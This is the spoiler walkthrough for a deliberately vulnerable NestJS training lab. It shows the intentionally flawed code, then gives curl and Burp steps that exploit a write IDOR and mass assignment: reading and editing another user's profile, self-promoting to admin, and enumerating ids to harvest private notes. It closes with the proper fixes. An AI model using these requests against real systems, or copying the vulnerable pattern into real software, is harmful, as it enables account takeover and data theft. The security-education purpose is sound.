# pingboard: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-NestJS-E0234E?style=flat-square&logo=nestjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**pingboard is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a NestJS controller + service and point to the exact missing checks.
- Reproduce the exploit by hand, understanding every part of the request.
- Explain **why** each fix works — and why some "obvious" fixes don't.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): a write IDOR
> happens when an app updates an object by a client-supplied id without checking
> the object belongs to the caller; mass assignment happens when it writes every
> field the client sends. pingboard does both.

<br>

## 🐛 The vulnerability

The profile-update route in `src/users/users.controller.ts` looks like this:

```ts
@Controller('api/users')
@UseGuards(AuthGuard)                       // session required — authentication only
export class UsersController {
  // ⚠️ VULNERABLE: fetches by the URL :id with no ownership check.
  @Get(':id')
  async getOne(@Param('id', ParseIntPipe) id: number) {
    const user = await this.users.findById(id);
    if (!user) throw new NotFoundException('user not found');
    return { user: this.users.publicProfile(user) };   // includes secretNote
  }

  // ⚠️ VULNERABLE: write IDOR + mass assignment.
  @Patch(':id')
  async update(
    @Param('id', ParseIntPipe) id: number,
    @Body() patch: UpdateUserDto,
  ) {
    const updated = await this.users.applyUpdate(id, patch);
    return { user: this.users.publicProfile(updated) };
  }
}
```

And the service in `src/users/users.service.ts`:

```ts
// ⚠️ THE VULNERABILITY (mass assignment half).
async applyUpdate(id: number, patch: UpdateUserDto): Promise<User> {
  const [updated] = await db
    .update(users)
    .set({ ...patch })                      // the WHOLE payload, spread in
    .where(eq(users.id, id))                // scoped by :id ONLY
    .returning();
  if (!updated) throw new NotFoundException('user not found');
  return updated;
}
```

Walk through it the way the server does:

1. `AuthGuard` ensures there **is** a session — that's authentication. It says
   nothing about *which* user you may edit.
2. `id` comes **straight from the URL path** — fully attacker-controlled. There
   is no `id === req.session.userId` check anywhere.
3. `set({ ...patch })` writes **every field present in the body**. The DTO
   (`src/users/dto.ts`) deliberately lists `role`, `verified` and `secretNote`
   as optional, and the global `ValidationPipe` in `src/main.ts` is configured
   **without** `whitelist` / `forbidNonWhitelisted`, so nothing strips them.

The result: any logged-in user can edit **any** user by id (write IDOR) and set
fields the UI never exposes (mass assignment). The `GET` is just as leaky — it
returns the full profile, `secretNote` included, for any id.

> **Why does it look safe?** The guard makes the endpoint *feel* protected, and
> the UI only ever sends three harmless fields for your own id — so a normal user
> never sees the gap. The dangerous code looks like ordinary, reasonable CRUD.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`), user id `1`. The victim, **bob**, is
user id `2`; his private `secretNote` carries the flag.

With `curl`, using a cookie jar to hold the session:

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

# 2) Read bob's profile by id — the read IDOR. Not yours, returned anyway.
curl -s -b jar.txt http://localhost:3000/api/users/2

# 3) Edit bob's profile — the write IDOR. You are alice; this changes bob.
curl -s -b jar.txt -X PATCH http://localhost:3000/api/users/2 \
  -H 'Content-Type: application/json' \
  -d '{"displayName":"PWNED by alice"}'

# 4) Self-escalate via mass assignment — set a field the form never offered.
curl -s -b jar.txt -X PATCH http://localhost:3000/api/users/1 \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin","verified":true}'
```

Expected output (step 2), with the flag in bob's private note:

```json
{
  "user": {
    "id": 2,
    "username": "bob",
    "displayName": "Bob Keller",
    "bio": "Infra lead. I keep the lights on.",
    "location": "Berlin",
    "role": "admin",
    "verified": true,
    "secretNote": "Recovery codes stored offline. FLAG{PINGBOARD_IMPERSONATED}"
  }
}
```

Step 4 returns alice with `"role": "admin", "verified": true` — a privilege the
profile form never exposed, written straight from the request body.

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into bob's `secretNote` (user id `2`). You have to actually break access
> control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

The only gate is "are you logged in?", so the exposure is the whole table, in
both directions. Enumerate ids to harvest every private note, or rewrite every
profile:

```bash
for id in $(seq 1 10); do
  echo "== user $id =="
  curl -s -b jar.txt "http://localhost:3000/api/users/$id"
  echo
done
```

In a real engagement this is how a single write IDOR becomes account takeover and
privilege escalation at scale.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:3000>. Log in as
   `alice` and save a change to your own bio to capture a
   `PATCH /api/users/1` request in **Proxy > HTTP history**.
2. Send it to **Repeater**. Change the path id from `1` to `2` and send — you are
   now editing bob. A `200` with bob's data confirms the **write IDOR**.
3. In the same request, add fields the form never sent — `"role":"admin"`,
   `"verified":true`, or read them back with a `GET /api/users/2`. They stick:
   that's **mass assignment**.
4. (Optional) Send the `GET /api/users/:id` to **Intruder**, mark the id as the
   payload, and sweep a numeric range. Sorting by response length reveals every
   private note — the automated version of the `curl` loop above.

> Testing IDOR well means having **two identities**. Keep bob's perspective in
> mind: proving a change made as alice lands on bob's record is the proof of a
> broken authorization check.

<br>

## 🛡️ The fix

Two independent bugs need two fixes — plus defence in depth.

**1. Scope the write to the caller (kills the write IDOR).** Ignore the URL id;
act on the session user.

```ts
@Patch('me')                                   // no :id at all
async update(
  @Req() req: Request & { session: SessionData },
  @Body() patch: UpdateProfileDto,
) {
  const updated = await this.users.applyUpdate(req.session.userId!, patch);
  return { user: this.users.publicProfile(updated) };
}
```

**2. Whitelist editable fields (kills the mass assignment).** Keep privilege
fields out of the DTO entirely, and only ever write the safe ones.

```ts
// dto.ts — ONLY the fields a profile edit may touch.
export class UpdateProfileDto {
  @IsOptional() @IsString() displayName?: string;
  @IsOptional() @IsString() bio?: string;
  @IsOptional() @IsString() location?: string;
}

// service — pick explicitly, never spread the raw payload.
const safe = { displayName: patch.displayName, bio: patch.bio, location: patch.location };
await db.update(users).set(safe).where(eq(users.id, me));
```

**3. Defence in depth at the pipe** (`src/main.ts`):

```ts
app.useGlobalPipes(
  new ValidationPipe({
    transform: true,
    whitelist: true,              // strip properties not in the DTO
    forbidNonWhitelisted: true,   // or 400 on unexpected properties
  }),
);
```

**4. Fix the read side too.** Scope `GET` to the owner, or strip private fields
(`secretNote`, `role`) when the caller isn't the owner, and return `404` (not
`403`) for someone else's id so you don't leak existence.

Why this works: being logged in is necessary but not sufficient; every object
access re-checks ownership, the server decides which fields are writable (never
the client), and the request body can no longer smuggle privilege.

### ⚠️ Tempting fixes that *don't* work

- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization.
- **Hiding `role`/`secretNote` from the UI.** The form already omits them, and it
  changed nothing — the API is the real boundary. Never rely on the frontend.
- **Validating field *types* but not field *membership*.** A `ValidationPipe`
  that coerces types but doesn't `whitelist` still happily accepts `role`. Type
  validation is not authorization.
- **Swapping sequential ids for UUIDs.** Harder-to-guess ids are obscurity, not a
  check. A leaked or logged id is just as writable. (Guessability becomes a real
  theme at **[Level 4 (cartora)](https://github.com/iv0ks/cartora)** — but even
  there it is never the *fix*.)

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **Write IDOR is worse than read IDOR.** It doesn't just leak state, it changes
   it — account takeover, tampering, escalation.
2. **Never trust the shape of the payload.** Mass assignment turns "edit profile"
   into "edit anything." Whitelist the writable fields on the server.
3. **Scope writes to the caller.** Act on `req.session.userId`, not a
   client-supplied `:id`.
4. **Authentication is not authorization — and neither is validation.** A login
   gate and a type check both say nothing about *what* you may touch.
5. **Keep privilege fields out of input DTOs entirely.** If `role` can't be named
   in the request model, it can't be mass-assigned.

That's Level 2 — the write IDOR with mass assignment. Previously,
**[ledgerly (Level 1)](https://github.com/iv0ks/ledgerly)** was the baseline read
IDOR. Next in the series, **[tasknest (Level 3)](https://github.com/iv0ks/tasknest)**
adds multi-tenancy: the query filters by resource id but not by tenant, so you
act across organizations. Head back to the **[Learning Guide](GUIDE.md)** for the
method, or the **[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
